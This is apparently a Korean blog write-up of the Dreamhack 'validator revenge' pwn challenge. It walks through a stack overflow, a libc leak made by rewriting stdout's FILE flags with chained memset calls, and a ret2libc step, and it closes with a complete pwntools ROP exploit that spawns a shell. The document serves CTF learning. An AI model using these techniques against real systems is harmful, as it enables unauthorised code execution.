---
title: Dreamhack - validator revenge
date: 2025-03-24 15:43:21 +0900
categories: [pwn]
---


디컴파일 코드는 다음과 같다.

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  char s[128]; // [rsp+0h] [rbp-80h] BYREF

  sub_400699(a1, a2, a3);
  memset(s, 0, sizeof(s));
  read(0, s, 0x400uLL);
  sub_4006DC(s, 128LL);
  fflush(stdout);
  return 0LL;
}
```

sub_400699는 그냥 버퍼 관련 함수들이 있다.

sub_4006dc는 다음과 같다.

```c
__int64 __fastcall sub_4006DC(__int64 a1, __int64 a2)
{
  unsigned int i; // [rsp+1Ch] [rbp-4h]
  int j; // [rsp+1Ch] [rbp-4h]

  for ( i = 0; i <= 9; ++i )
  {
    if ( *(_BYTE *)((int)i + a1) != aDreamhack[i] )
      exit(0);
  }
  for ( j = 11; j < (unsigned __int64)(a2 - 10); ++j )
  {
    if ( *(unsigned __int8 *)(j + a1) != *(char *)(j + 1LL + a1) + 1 )
      exit(0);
  }
  return 0LL;
}
```

이 코드는 aDreamhack이라는 배열과 입력을 비교하고, 그 후 일정 길이 만큼에서 값이 점점 작아져야한다.

출력 함수가 없어 어떻게 leak을 해야하나 찾아보다가 stdout 구조체를 건드려서 내부적으로 write함수를 호출할 수 있다는 것을 알게되었다. 

 stack pivoting을 통해 bss에서 stdout과 stdin 사이에 공간이 조금 남는 것을 활용해서 rsi에 stdout을 넣고 read를 호출해서 값을 조작하는 방향으로 진행을 했었는데, 시간을 들여서 계속 시도해보니까 rsi에 값을 넣고 쓰는 것까지는 성공했으나. 그 이후에 stack pivoting을 반복하여 ROP를 하다보니까 실행 흐름이 복잡해지고 분석도 너무 힘들었다.. 그래서 이 방향은 너무 어려운 것 같아서 좀 분석해보니까

그냥 ROP를 하지 않고 fflush 이후 종료될 때의 레지스터를 확인해보니까 rdi에 stdout이 그대로 남아있었다!!!!!

memset은 memset(void *ptr, int value, size_t num) 이런 형식을 가지고, 이미 rdi에 stdout이 있기 때문에 우리는 pop rsi, pop rdx 가젯을 사용해서 value와 num만 조작해주면 stdout을 쉽게 조작할 수 있다.

하지만 우리는 rdi를 조작할 수 없기 때문에 일단 stdout의 write_base의 첫 번째 바이트까지 0으로 초기화 해준 다음,  value는 1바이트 씩 쪼개서 넣고, num은 점점 줄여가는 식으로 flags를 0xfbfbfbfb → 0xfbadadad → 0xfbad1818 → 0xfbad1800 이렇게 memset을 반복적으로 호출해서 조작해줬다. 이렇게 한 다음 fflush를 호출하면 조작된 stdout 구조체를 인자로 호출되는데, 이러면 write_base의 값을 leak 할 수 있다.

> 참고 :  stdout의 file structure flag를 이용한 libc leak
> 

이렇게 릭한 값을 gdb로 열어서 base와의 오프셋을 계산한다. 오프셋은 항상 같기 때문에 나중에 서버에서 돌릴 때 바로 빼주면 libc base 계산이 가능하다

이렇게 구한 base로 system, binsh 주소를 전부 계산할 수 있고 이제 다시 ROP를 해서 /bin/sh를 인자로 system함수를 호출하면 된다. 

SFP를 딱히 쓸게 아니라 SFP도 그냥 더미로 덮었었는데, gdb로 확인해보니까 이상한 값이 들어가서 여기다가 push나 pop 하려하니까 SIGSEGV가 떠서 SFP에 bss영역의 주소를 줬다. 드디어 익스플로잇에 성공했다… 처음으로 고난도 문제를 풀어봤다.

머리가 좋지 않으면 몸이 고생한다는 것을 많이 느꼈다.. 이걸 빨리 알았으면 더 빨리 풀 수 있었는데 말이다.

```python
from pwn import *

context.arch = 'amd64'
context.bits = 64
context.log_level = "DEBUG"
p = process("./validator_revenge_patched")
# p = remote("host3.dreamhack.games", 19964)
e = ELF("./validator_revenge_patched")
libc = ELF("./libc-2.27.so")

bss = e.bss()
pop_rdi = 0x400873
pop_rsi = 0x40068b
pop_rdx = 0x400694
memset_plt = e.plt['memset']
fflush_plt = e.plt['fflush']
ret = 0x40053e

# gdb.attach(p)

frame = b"DREAMHACK!"
for i in range(128-len(frame),0,-1):
    frame += chr(i).encode()
frame += p64(bss + 0x300)

payload = frame
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rdx) + p64(0x21)
payload += p64(memset_plt)

payload += p64(pop_rsi) + p64(0xfb)
payload += p64(pop_rdx) + p64(4)
payload += p64(memset_plt)

payload += p64(pop_rsi) + p64(0xad)
payload += p64(pop_rdx) + p64(3)
payload += p64(memset_plt)

payload += p64(pop_rsi) + p64(0x18)
payload += p64(pop_rdx) + p64(2)
payload += p64(memset_plt)

payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rdx) + p64(1)
payload += p64(memset_plt)

payload += p64(fflush_plt)
payload += p64(0x4007c5)

# pause()

p.send(payload)

leak = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
libc_base = leak - 0x3ed8b0
system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))
# og = libc_base + 0x10a45c

log.info(f"libc base : {hex(libc_base)}")
log.info(f"system : {hex(system)}")
log.info(f"binsh : {hex(binsh)}")

payload = frame
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(ret)
payload += p64(system)
# payload += p64(og)

# pause()
p.send(payload)

p.interactive()
```